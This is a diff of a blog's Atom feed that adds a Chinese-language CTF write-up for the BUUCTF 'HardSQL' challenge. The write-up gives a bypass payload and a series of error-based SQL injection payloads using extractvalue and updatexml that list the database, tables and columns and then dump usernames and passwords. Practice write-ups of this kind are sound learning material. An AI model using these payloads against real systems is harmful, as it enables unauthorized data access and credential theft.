@@ -44,6 +44,33 @@
   </entry>
   
   <entry>
+    <title>buuctf_HardSQL</title>
+    <link href="http://1768161086.github,io/2025/02/03/HardSQL/"/>
+    <id>http://1768161086.github,io/2025/02/03/HardSQL/</id>
+    <published>2025-02-03T00:56:21.000Z</published>
+    <updated>2025-02-15T01:14:37.142Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote><h1 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h1></blockquote><p>题目环境：</p><p><img src="/2025/02/03/HardSQL/Users/xu/hexo-blog/source/_posts/HardSQL/1.png" alt="loading-ag-97"></p><p>由题目可知是sql注入</p><p>1.使用万能密码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27; or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p>发现了一句话:你可别被我逮住了，臭弟弟</p><p>其中union，select，order by等都被过滤了</p><p>2.输入查询列：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27; order by 3#</span><br></pre></td></tr></table></figure><p>通过常规注入回显的都是这句话</p><p>3.我们尝试报错注入</p><p>报错注入有两个函数，这里我们使用updatexml(a,b,c)，此函数a，c必须为String类型，因此可以使a,c不为String型进行报错</p><p>(1)我们先去爆数据库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=admin&amp;password=admin&#x27;^extractvalue(1,concat(0x5c,(select(database()))))%23</span><br></pre></td></tr></table></figure><p>于是我们知道了库名叫：geek</p><p>(2)爆表名,但是这里把等于号给我们过滤了，不过我们知道like用法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=admin&amp;password=admin&#x27;^extractvalue(1,concat(0x5c,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#x27;geek&#x27;))))</span><br></pre></td></tr></table></figure><p>于是爆出表名：H4rdSQ1</p><p>(3)爆列名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=admin&amp;password=admin&#x27;^extractvalue(1,concat(0x5c,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;H4rDsq1&#x27;))))%23</span><br></pre></td></tr></table></figure><p>于是爆出表名:id,username,password</p><p>(4)爆数据:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=1%27or(updatexml(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)),0x7e),1))%23&amp;password=1</span><br></pre></td></tr></table></figure><p>这里因为用extractvalue()函数，一次只能显示32个字符，我们需要用right函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=1%27or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))%23&amp;password=1</span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;blockquote&gt;
+&lt;h1 id=&quot;极客大挑战-2019-HardSQL&quot;&gt;&lt;a href=&quot;#极客大挑战-2019-HardSQL&quot; class=&quot;headerlink&quot; title=&quot;[极客大挑战 2019]HardSQL&quot;&gt;&lt;/a&gt;[极客大挑战 2019]HardSQ</summary>
+      
+    
+    
+    
+    
+    <category term="web" scheme="http://1768161086.github,io/tags/web/"/>
+    
+    <category term="原创" scheme="http://1768161086.github,io/tags/%E5%8E%9F%E5%88%9B/"/>
+    
+    <category term="sql注入" scheme="http://1768161086.github,io/tags/sql%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
+  
+  <entry>
     <title>buuctf-easy_tornado</title>
     <link href="http://1768161086.github,io/2025/02/01/buuctf-easy-tornado/"/>
     <id>http://1768161086.github,io/2025/02/01/buuctf-easy-tornado/</id>
